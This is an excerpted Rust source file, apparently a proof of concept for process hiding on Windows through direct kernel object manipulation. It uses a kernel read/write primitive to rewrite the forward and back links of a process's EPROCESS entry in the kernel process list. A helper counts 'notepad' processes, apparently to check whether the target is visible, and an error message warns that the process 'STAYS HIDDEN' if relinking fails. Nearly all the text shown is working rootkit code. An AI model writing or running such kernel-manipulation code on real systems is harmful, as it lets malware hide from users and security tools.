...
fn count_notepad() -> usize {
    ...
    match out {
        Ok(o) => {
            ...
            s.lines().filter(|l| l.to_ascii_lowercase().contains("notepad")).count()
        }
        Err(_) => usize::MAX,
    }
}
...
fn relink(krw: &dyn KernelRw, head_kva: usize, eproc_kva: usize) -> Result<(), String> {
    ...
    let head_flink = krw.kread_u64(head_kva).map_err(|e| format!("kread head.flink: {}", e))? as usize;
    ...
    krw.kwrite_u64(link_kva, head_flink as u64).map_err(|e| format!("kwrite victim.flink: {}", e))?;
    krw.kwrite_u64(link_kva + 8, head_kva as u64).map_err(|e| format!("kwrite victim.blink: {}", e))?;
    krw.kwrite_u64(head_kva, link_kva as u64).map_err(|e| format!("kwrite head.flink: {}", e))?;
    krw.kwrite_u64(head_flink + 8, link_kva as u64).map_err(|e| format!("kwrite head_flink.blink: {}", e))?;
    Ok(())
}
...
fn main() {
    ...
    match relink(&krw, head_kva, eproc) {
        ...
        Err(e) => { eprintln!("[FAIL] relink: {} — PROCESS STAYS HIDDEN, manual fix needed", e); }
    }
